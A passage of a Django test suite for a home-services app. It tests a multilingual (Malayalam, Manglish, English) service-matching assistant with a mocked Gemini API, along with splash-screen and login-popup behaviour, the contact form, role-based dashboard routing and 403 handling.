        res = match_service_and_workers('\u0d0e\u0d28\u0d3f\u0d15\u0d4d\u0d15\u0d4d \u0d12\u0d30\u0d41 \u0d15\u0d4d\u0d32\u0d40\u0d28\u0d31\u0d46 \u0d35\u0d47\u0d23\u0d02')
        self.assertIsNotNone(res['service'])

    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_malayalam_plumber_request(self, _):
        res = match_service_and_workers('\u0d2a\u0d4d\u0d32\u0d02\u0d2c\u0d7c \u0d35\u0d47\u0d23\u0d02')
        self.assertIsNotNone(res['service'])

    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_malayalam_electrician_request(self, _):
        res = match_service_and_workers('\u0d07\u0d32\u0d15\u0d4d\u0d1f\u0d4d\u0d30\u0d40\u0d37\u0d4d\u0d2f\u0d7b \u0d35\u0d47\u0d23\u0d02')
        self.assertIsNotNone(res['service'])

    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_malayalam_carpenter_ashary(self, _):
        res = match_service_and_workers('\u0d12\u0d30\u0d41 \u0d06\u0d36\u0d3e\u0d30\u0d3f \u0d35\u0d47\u0d23\u0d02')
        self.assertIsNotNone(res['service'])

    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_unrecognised_query_returns_none(self, _):
        res = match_service_and_workers('xyzzy foo bar baz')
        self.assertIsNone(res['service'])

    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_manglish_stop_words_only_returns_none(self, _):
        res = match_service_and_workers('enik oru venam')
        self.assertIsNone(res['service'])


class MultilingualGuestEndpointTest(TestCase):
    """Integration tests: guest user branch replies in Malayalam/Manglish/English."""

    def setUp(self):
        from django.core.cache import cache
        cache.clear()
        self.addCleanup(cache.clear)
        Service.objects.create(
            name='Electrician', description='Electrical work', price=500, is_active=True
        )
        self.url = reverse('ai_service_assistant')
        self.client.logout()

    def _post_json(self, message):
        import json
        return self.client.post(
            self.url,
            data=json.dumps({'message': message}),
            content_type='application/json',
        )

    # --- English greetings ---
    @patch('lamoapp.ai_utils._call_gemini_api')
    def test_english_hello_no_gemini_call(self, mock_gemini):
        response = self._post_json('hello')
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertTrue(data['success'])
        self.assertEqual(data['type'], 'chat')
        mock_gemini.assert_not_called()

    @patch('lamoapp.ai_utils._call_gemini_api')
    def test_english_how_are_you_no_gemini_call(self, mock_gemini):
        response = self._post_json('how are you')
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertTrue(data['success'])
        mock_gemini.assert_not_called()

    # --- Manglish greetings ---
    @patch('lamoapp.ai_utils._call_gemini_api')
    def test_manglish_namaskaram_greeting(self, mock_gemini):
        response = self._post_json('namaskaram')
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertTrue(data['success'])
        self.assertEqual(data['type'], 'chat')
        self.assertIn('Namaskaram', data['message'])
        mock_gemini.assert_not_called()

    @patch('lamoapp.ai_utils._call_gemini_api')
    def test_manglish_sugamano(self, mock_gemini):
        response = self._post_json('sugamano')
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertTrue(data['success'])
        mock_gemini.assert_not_called()

    # --- Manglish service request -> login_required in Manglish ---
    @patch('lamoapp.ai_utils._call_gemini_api')
    def test_manglish_service_request_prompts_login(self, mock_gemini):
        response = self._post_json('Enik oru electrician venam')
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertTrue(data['success'])
        self.assertEqual(data['type'], 'login_required')
        self.assertIn('Login', data['message'])
        mock_gemini.assert_not_called()

    # --- Malayalam service request -> login_required ---
    @patch('lamoapp.ai_utils._call_gemini_api')
    def test_malayalam_service_request_prompts_login(self, mock_gemini):
        response = self._post_json('\u0d0e\u0d28\u0d3f\u0d15\u0d4d\u0d15\u0d4d \u0d12\u0d30\u0d41 \u0d15\u0d4d\u0d32\u0d40\u0d28\u0d31\u0d46 \u0d35\u0d47\u0d23\u0d02')
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertTrue(data['success'])
        self.assertEqual(data['type'], 'login_required')
        mock_gemini.assert_not_called()

    # --- English service query shows service list ---
    @patch('lamoapp.ai_utils._call_gemini_api')
    def test_english_services_query(self, mock_gemini):
        response = self._post_json('what services do you offer')
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertTrue(data['success'])
        self.assertIn('Electrician', data['message'])
        mock_gemini.assert_not_called()

    # --- No Gemini calls at all for guest ---
    @patch('lamoapp.ai_utils._call_gemini_api')
    def test_all_guest_paths_make_no_gemini_calls(self, mock_gemini):
        for msg in (
            'hello', 'namaskaram', 'sugamano', 'how are you',
            'Enik oru electrician venam', 'what services',
        ):
            self._post_json(msg)
        mock_gemini.assert_not_called()


class MultilingualAuthenticatedEndpointTest(TestCase):
    """Integration tests: logged-in user branch replies in user's language."""

    def setUp(self):
        from django.core.cache import cache
        cache.clear()
        self.addCleanup(cache.clear)

        self.customer = _make_user('ml_customer')
        self.electrician_service = Service.objects.create(
            name='Electrician', description='Wiring repairs', price=500, is_active=True
        )
        self.plumber_service = Service.objects.create(
            name='Plumbing', description='Pipe repair', price=400, is_active=True
        )
        self.cleaner_service = Service.objects.create(
            name='Cleaning', description='House cleaning', price=600, is_active=True
        )
        self.url = reverse('ai_service_assistant')
        self.client.login(username='ml_customer', password='Password123!')

    def _post(self, message):
        import json
        return self.client.post(
            self.url,
            data=json.dumps({'message': message}),
            content_type='application/json',
        )

    # --- Manglish greeting: Gemini unavailable -> Manglish fallback ---
    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_manglish_namaskaram_greeting_fallback(self, mock_gemini):
        response = self._post('namaskaram')
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertTrue(data['success'])
        self.assertEqual(data['type'], 'chat')
        self.assertIn('Namaskaram', data['message'])
        mock_gemini.assert_called_once()

    # --- Manglish greeting: Gemini returns a reply ---
    @patch('lamoapp.ai_utils._call_gemini_api', return_value='Namaskaram! \ud83d\udc4b Enthu sahayam venam?')
    def test_manglish_greeting_gemini_response(self, mock_gemini):
        response = self._post('namaskaram')
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertTrue(data['success'])
        self.assertIn('Namaskaram', data['message'])

    # --- English service query ---
    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_english_electrician_matches(self, _):
        response = self._post('I need an electrician')
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertTrue(data['success'])
        self.assertEqual(data['type'], 'service_match')
        self.assertIn('electric', data['service']['name'].lower())

    # --- Manglish service query ---
    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_manglish_electrician_venam_matches(self, _):
        response = self._post('Enik oru electrician venam')
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertTrue(data['success'])
        self.assertEqual(data['type'], 'service_match')

    # --- Spelling variation: electrisian ---
    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_manglish_electrisian_spelling_matches(self, _):
        response = self._post('electrisian venam')
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertTrue(data['success'])
        self.assertEqual(data['type'], 'service_match')

    # --- Spelling variation: plambur ---
    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_manglish_plambur_matches(self, _):
        response = self._post('plambur undo')
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertTrue(data['success'])
        self.assertEqual(data['type'], 'service_match')

    # --- Manglish cleaner ---
    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_manglish_veedu_clean_matches(self, _):
        response = self._post('veedu clean cheyyam')
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertTrue(data['success'])
        self.assertEqual(data['type'], 'service_match')

    # --- Malayalam plumber ---
    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_malayalam_plumber_matches(self, _):
        import json
        response = self.client.post(
            self.url,
            data=json.dumps({'message': '\u0d2a\u0d4d\u0d32\u0d02\u0d2c\u0d7c \u0d35\u0d47\u0d23\u0d02'}),
            content_type='application/json',
        )
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertTrue(data['success'])
        self.assertEqual(data['type'], 'service_match')

    # --- Malayalam cleaner ---
    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_malayalam_cleaner_matches(self, _):
        import json
        response = self.client.post(
            self.url,
            data=json.dumps({'message': '\u0d0e\u0d28\u0d3f\u0d15\u0d4d\u0d15\u0d4d \u0d12\u0d30\u0d41 \u0d15\u0d4d\u0d32\u0d40\u0d28\u0d31\u0d46 \u0d35\u0d47\u0d23\u0d02'}),
            content_type='application/json',
        )
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertTrue(data['success'])
        self.assertEqual(data['type'], 'service_match')

    # --- Unrecognised query English ---
    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_unrecognised_query_english_no_match(self, _):
        response = self._post('xyzzy foo bar baz')
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertFalse(data['success'])
        self.assertIn("couldn't find", data['message'].lower())

    # --- Unrecognised query Manglish ---
    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_unrecognised_manglish_no_match_message(self, _):
        response = self._post('enik oru venam')
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertFalse(data['success'])
        self.assertIn('Sorry', data['message'])

    # --- Rate limits still enforced ---
    @patch('lamoapp.ai_utils._call_gemini_api', return_value=None)
    def test_rate_limit_still_applies(self, _):
        from lamoapp.rate_limit import AI_ASSISTANT_PER_MINUTE
        for _ in range(AI_ASSISTANT_PER_MINUTE):
            self._post('I need an electrician')
        blocked = self._post('I need an electrician')
        self.assertEqual(blocked.status_code, 429)

    # --- API key never in URL (security regression) ---
    def test_gemini_key_not_in_url(self):
        from lamoapp.ai_utils import _call_gemini_api
        REAL_KEY = 'AIzaSyD-EXAMPLE-abcdefghijklmnopqrstuvwxyz012345'
        captured = {}
        import json as _json, io

        def fake_urlopen(req, timeout=None):
            captured['url'] = req.full_url

            class _R(io.BytesIO):
                def __init__(self):
                    super().__init__(_json.dumps({
                        'candidates': [{'content': {'parts': [{'text': 'Electrician'}]}}]
                    }).encode())
                def __enter__(self): return self
                def __exit__(self, *a): return False

            return _R()

        with override_settings(GOOGLE_API_KEY=REAL_KEY):
            with patch('urllib.request.urlopen', side_effect=fake_urlopen):
                _call_gemini_api('test')

        self.assertNotIn(REAL_KEY, captured.get('url', ''))
        self.assertNotIn('key=', captured.get('url', ''))


class MultilingualSpellingVariationTest(TestCase):
    """Tests for common Manglish spelling variants of each service name."""

    def setUp(self):
        Service.objects.create(name='Electrician', description='Electrical', price=500, is_active=True)
        Service.objects.create(name='Plumbing', description='Plumbing', price=400, is_active=True)
        Service.objects.create(name='Carpentry', description='Wood work', price=700, is_active=True)
        Service.objects.create(name='Cleaning', description='Cleaning', price=600, is_active=True)
        Service.objects.create(name='Painting', description='Painting', price=800, is_active=True)

    def _match(self, query):
        with patch('lamoapp.ai_utils._call_gemini_api', return_value=None):
            return match_service_and_workers(query)

    def test_electrisian(self):
        self.assertIsNotNone(self._match('electrisian venam')['service'])

    def test_electrishen(self):
        self.assertIsNotNone(self._match('electrishen')['service'])

    def test_ilectrician(self):
        self.assertIsNotNone(self._match('ilectrician')['service'])

    def test_currentukaran(self):
        self.assertIsNotNone(self._match('currentukaran')['service'])

    def test_currentkaran(self):
        self.assertIsNotNone(self._match('currentkaran')['service'])

    def test_plamber(self):
        self.assertIsNotNone(self._match('plamber venam')['service'])

    def test_plambur(self):
        self.assertIsNotNone(self._match('plambur undo')['service'])

    def test_vellakkaran(self):
        self.assertIsNotNone(self._match('vellakkaran venam')['service'])

    def test_carpanter(self):
        self.assertIsNotNone(self._match('carpanter')['service'])

    def test_karpenter(self):
        self.assertIsNotNone(self._match('karpenter')['service'])

    def test_marapani(self):
        self.assertIsNotNone(self._match('marapani')['service'])

    def test_aasaari(self):
        self.assertIsNotNone(self._match('aasaari')['service'])

    def test_cleaningukari(self):
        self.assertIsNotNone(self._match('cleaningukari venam')['service'])

    def test_peyntar(self):
        self.assertIsNotNone(self._match('peyntar venam')['service'])

    def test_peynting(self):
        self.assertIsNotNone(self._match('peynting')['service'])


class SplashScreenAndLoginPopupFlowTest(TestCase):
    """
    Regression test suite for splash screen, splash-to-home transition,
    and automatic session-scoped login popup behavior.
    """

    def setUp(self):
        from .models import CustomUser, Service
        self.user = CustomUser.objects.create_user(
            username='flow_customer',
            email='flow_customer@example.com',
            password='TestPassword123!',
            role='CUSTOMER'
        )
        self.admin_user = CustomUser.objects.create_superuser(
            username='flow_admin',
            email='flow_admin@example.com',
            password='TestPassword123!'
        )
        Service.objects.create(name='Test Electrical', description='Wiring repair', price=500, is_active=True)

    def test_fresh_browser_session_renders_splash_screen(self):
        """A new, unauthenticated visitor on their first hit gets the splash screen."""
        response = self.client.get(reverse('home'))
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, 'splash.html')
        # Session flag is set
        self.assertTrue(self.client.session.get('lamo_splash_shown'))
        # Session cookie is set to expire on browser close (expiry == 0)
        self.assertEqual(self.client.session.get_expiry_age(), self.client.session.get_expiry_date() and self.client.session.get_expiry_age() or 0)

    def test_returning_visit_in_same_session_renders_home_page(self):
        """A second hit in the same browsing session renders the actual homepage, preventing loops."""
        # First hit triggers splash
        first_resp = self.client.get(reverse('home'))
        self.assertTemplateUsed(first_resp, 'splash.html')

        # Second hit in the same session renders home.html
        second_resp = self.client.get(reverse('home'))
        self.assertEqual(second_resp.status_code, 200)
        self.assertTemplateUsed(second_resp, 'home.html')

    def test_splash_to_home_transition_via_query_param(self):
        """Redirect from splash with from_splash=1 immediately serves home.html."""
        response = self.client.get(reverse('home') + '?from_splash=1')
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, 'home.html')
        self.assertTrue(self.client.session.get('lamo_splash_shown'))

    def test_search_query_bypasses_splash(self):
        """Direct search from URL (?q=...) skips splash and shows results immediately."""
        response = self.client.get(reverse('home') + '?q=Electrical')
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, 'home.html')

    def test_unauthenticated_user_receives_login_popup_markup_and_script(self):
        """Unauthenticated user homepage includes modal markup and session-scoped script."""
        session = self.client.session
        session['lamo_splash_shown'] = True
        session.save()

        response = self.client.get(reverse('home'))
        self.assertEqual(response.status_code, 200)
        content = response.content.decode('utf-8')

        # Modal elements are present
        self.assertIn('id="lamoLoginOverlay"', content)
        self.assertIn('id="lamoAutoLoginForm"', content)
        self.assertIn('id="lamoLoginClose"', content)

        # Session-scoped script is present
        self.assertIn('sessionStorage.getItem("lamo_login_popup_shown")', content)
        self.assertIn('sessionStorage.getItem("lamo_from_splash")', content)
        self.assertIn('sessionStorage.setItem("lamo_login_popup_dismissed"', content)

    def test_authenticated_user_does_not_receive_login_popup_script(self):
        """Authenticated users must never receive the automatic login popup trigger."""
        self.client.force_login(self.user)
        session = self.client.session
        session['lamo_splash_shown'] = True
        session.save()

        response = self.client.get(reverse('home'))
        self.assertEqual(response.status_code, 200)
        content = response.content.decode('utf-8')

        # The unauthenticated login popup block should not be rendered
        self.assertNotIn('sessionStorage.getItem("lamo_login_popup_shown")', content)
        self.assertNotIn('sessionStorage.getItem("lamo_from_splash")', content)

    def test_admin_redirected_to_admin_dashboard(self):
        """Admin users bypass both splash screen and homepage."""
        self.client.force_login(self.admin_user)
        response = self.client.get(reverse('home'))
        self.assertEqual(response.status_code, 302)
        self.assertIn(reverse('admin_dashboard'), response['Location'])

    def test_splash_html_contains_session_transition_script(self):
        """splash.html includes sessionStorage coordination and from_splash parameter."""
        response = self.client.get(reverse('home'))
        self.assertTemplateUsed(response, 'splash.html')
        content = response.content.decode('utf-8')
        self.assertIn('sessionStorage.setItem("lamo_from_splash", "true")', content)
        self.assertIn('from_splash=1', content)

    def test_home_html_handles_dismissal_and_storage_fallbacks(self):
        """home.html contains clean-up of legacy localStorage and graceful error catching."""
        session = self.client.session
        session['lamo_splash_shown'] = True
        session.save()

        response = self.client.get(reverse('home'))
        content = response.content.decode('utf-8')

        # Legacy localStorage cleanup is present
        self.assertIn('localStorage.removeItem("lamo_login_popup_shown")', content)
        # Dismissal tracking is present
        self.assertIn('sessionStorage.setItem("lamo_login_popup_dismissed", "true")', content)
        # Try-catch wrappers for storage access
        self.assertIn('try {', content)
        self.assertIn('catch (e)', content)


class ContactPageRenderingAndFormTest(TestCase):
    """Regression tests for contact.html page rendering, hero block, and form handling."""

    def setUp(self):
        from django.core.cache import cache
        cache.clear()

    def test_contact_page_get_renders_successfully(self):
        response = self.client.get(reverse('contact'))
        self.assertEqual(response.status_code, 200)
        self.assertTemplateUsed(response, 'contact.html')
        self.assertTemplateUsed(response, 'base.html')
        content = response.content.decode('utf-8')
        self.assertIn("Let's Talk", content)
        self.assertIn('Send Us a Message', content)
        self.assertIn('name="email"', content)
        self.assertIn('name="subject"', content)

    def test_contact_validation_failure_preserves_form_values(self):
        # Missing message triggers validation error
        data = {
            'name': 'Test User',
            'email': 'user@example.com',
            'phone': '9876543210',
            'subject': 'Help needed',
            'message': '',
        }
        response = self.client.post(reverse('contact'), data)
        self.assertEqual(response.status_code, 200)
        content = response.content.decode('utf-8')
        self.assertIn('Please fill in all required fields.', content)
        # Preserved values
        self.assertIn('value="Test User"', content)
        self.assertIn('value="user@example.com"', content)

    def test_contact_phone_longer_than_15_chars_does_not_crash(self):
        from lamoapp.models import ContactEnquiry
        data = {
            'name': 'Phone Tester',
            'email': 'phone@example.com',
            'phone': '+91 98765 432101',  # 17 chars
            'subject': 'Phone formatting test',
            'message': 'Testing phone field max length safety.',
        }
        response = self.client.post(reverse('contact'), data)
        self.assertEqual(response.status_code, 200)
        enquiry = ContactEnquiry.objects.filter(email='phone@example.com').first()
        self.assertIsNotNone(enquiry)
        self.assertLessEqual(len(enquiry.phone), 15)


class MultiTabAuthenticationAndOptimizationTests(TestCase):
    """
    Regression test suite for:
    - Multi-tab authentication and role-based redirect consistency
    - Safe dashboard routing across Customer, Worker, and Admin roles
    - 403 Forbidden handling and custom 403 error page rendering
    - Splash screen cookie and session synchronization
    - Resend and external API timeout bounds
    - Database query optimization on dashboards
    """

    def setUp(self):
        from .models import CustomUser, WorkerProfile, Service, Booking
        # Customer
        self.customer = CustomUser.objects.create_user(
            username='tab_customer',
            email='tab_customer@example.com',
            password='Password123!',
            role='USER',
            is_email_verified=True,
        )
        # Service
        self.service = Service.objects.create(
            name='AC Repair',
            description='AC service',
            price=800,
            is_active=True,
        )
        # Worker
        self.worker_user = CustomUser.objects.create_user(
            username='tab_worker',
            email='tab_worker@example.com',
            password='Password123!',
            role='WORKER',
            is_email_verified=True,
        )
        self.worker_profile = WorkerProfile.objects.create(
            user=self.worker_user,
            service=self.service,
            is_verified=True,
            availability='AVAILABLE',
        )
        # Admin
        self.admin = CustomUser.objects.create_superuser(
            username='tab_admin',
            email='tab_admin@example.com',
            password='Password123!',
            role='ADMIN',
            is_email_verified=True,
        )
        self.booking = Booking.objects.create(
            customer=self.customer,
            service=self.service,
            status='ACCEPTED',
            worker=self.worker_profile,
            estimated_cost=800,
        )

    def test_unauthenticated_dashboard_redirects_to_login(self):
        """Unauthenticated requests to any dashboard redirect to login."""
        dashboards = ['dashboard', 'user_dashboard', 'worker_dashboard', 'admin_dashboard']
        for db in dashboards:
            resp = self.client.get(reverse(db))
            self.assertEqual(resp.status_code, 302, f"Failed for {db}")
            self.assertIn(reverse('login'), resp['Location'])

    def test_customer_role_dashboard_routing(self):
        """Customer accessing /dashboard/ or /user-dashboard/ is routed correctly."""
        self.client.force_login(self.customer)
        # /dashboard/ routes Customer to home
        resp = self.client.get(reverse('dashboard'))
        self.assertEqual(resp.status_code, 302)
        self.assertIn(reverse('home'), resp['Location'])

        # /user-dashboard/ renders user_dashboard.html
        resp = self.client.get(reverse('user_dashboard'))
        self.assertEqual(resp.status_code, 200)

        # Customer accessing worker_dashboard redirects to dashboard -> home
        resp = self.client.get(reverse('worker_dashboard'))
        self.assertEqual(resp.status_code, 302)
        self.assertIn(reverse('dashboard'), resp['Location'])

        # Customer accessing admin_dashboard redirects to dashboard -> home
        resp = self.client.get(reverse('admin_dashboard'))
        self.assertEqual(resp.status_code, 302)
        self.assertIn(reverse('dashboard'), resp['Location'])

    def test_worker_role_dashboard_routing(self):
        """Worker accessing /dashboard/ or /worker-dashboard/ is routed correctly."""
        self.client.force_login(self.worker_user)
        # /dashboard/ routes Worker to worker_dashboard
        resp = self.client.get(reverse('dashboard'))
        self.assertEqual(resp.status_code, 302)
        self.assertIn(reverse('worker_dashboard'), resp['Location'])

        # /worker-dashboard/ renders
        resp = self.client.get(reverse('worker_dashboard'))
        self.assertEqual(resp.status_code, 200)

        # Worker accessing user_dashboard redirects to dashboard -> worker_dashboard
        resp = self.client.get(reverse('user_dashboard'))
        self.assertEqual(resp.status_code, 302)
        self.assertIn(reverse('dashboard'), resp['Location'])

        # Worker accessing admin_dashboard redirects to dashboard
        resp = self.client.get(reverse('admin_dashboard'))
        self.assertEqual(resp.status_code, 302)
        self.assertIn(reverse('dashboard'), resp['Location'])

    def test_admin_role_dashboard_routing(self):
        """Admin accessing /dashboard/ or /admin-dashboard/ is routed correctly."""
        self.client.force_login(self.admin)
        # /dashboard/ routes Admin to admin_dashboard
        resp = self.client.get(reverse('dashboard'))
        self.assertEqual(resp.status_code, 302)
        self.assertIn(reverse('admin_dashboard'), resp['Location'])

        # /admin-dashboard/ renders
        resp = self.client.get(reverse('admin_dashboard'))
        self.assertEqual(resp.status_code, 200)

        # Admin visiting home is redirected to admin_dashboard
        resp = self.client.get(reverse('home'))
        self.assertEqual(resp.status_code, 302)
        self.assertIn(reverse('admin_dashboard'), resp['Location'])

    def test_multi_tab_session_switch_simulation(self):
        """Simulate Tab 1 (Customer) and Tab 2 (Worker) in same browser session."""
        # Tab 1: Customer logs in
        self.client.force_login(self.customer)
        resp1 = self.client.get(reverse('user_dashboard'))
        self.assertEqual(resp1.status_code, 200)

        # Tab 2: Logs in as Worker in same browser (client session updated)
        self.client.force_login(self.worker_user)
        resp2 = self.client.get(reverse('worker_dashboard'))
        self.assertEqual(resp2.status_code, 200)

        # Tab 1: User refreshes customer dashboard -> safely redirected via dashboard router
        resp1_refresh = self.client.get(reverse('user_dashboard'))
        self.assertEqual(resp1_refresh.status_code, 302)
        self.assertIn(reverse('dashboard'), resp1_refresh['Location'])

    def test_genuine_403_access_denied_cases(self):
        """Unauthorized access to other users' private bookings receives 403 Forbidden."""
        from .models import CustomUser
        other_user = CustomUser.objects.create_user(
            username='stranger_customer',
            email='stranger@example.com',
            password='Password123!',
            role='USER',
            is_email_verified=True,
        )
        self.client.force_login(other_user)
        # Attempt to access messages of self.booking (which belongs to self.customer)
        resp = self.client.get(reverse('booking_messages', args=[self.booking.id]))
        self.assertEqual(resp.status_code, 403)

    def test_custom_403_view_renders_403_template(self):
        """custom_403_view renders branded 403.html with 403 status."""
        from lamoapp.views import custom_403_view
        from django.test import RequestFactory
        from django.contrib.auth.models import AnonymousUser
        factory = RequestFactory()
        req = factory.get('/forbidden/')
        req.user = AnonymousUser()
        resp = custom_403_view(req)
        self.assertEqual(resp.status_code, 403)
        self.assertIn('Access Denied', resp.content.decode('utf-8'))

    def test_splash_screen_session_cookie_set_on_render(self):
        """Splash screen response sets lamo_splash_seen cookie."""
        resp = self.client.get(reverse('home'))
        self.assertEqual(resp.status_code, 200)
        self.assertTemplateUsed(resp, 'splash.html')
        self.assertIn('lamo_splash_seen', resp.cookies)
        self.assertEqual(resp.cookies['lamo_splash_seen'].value, '1')





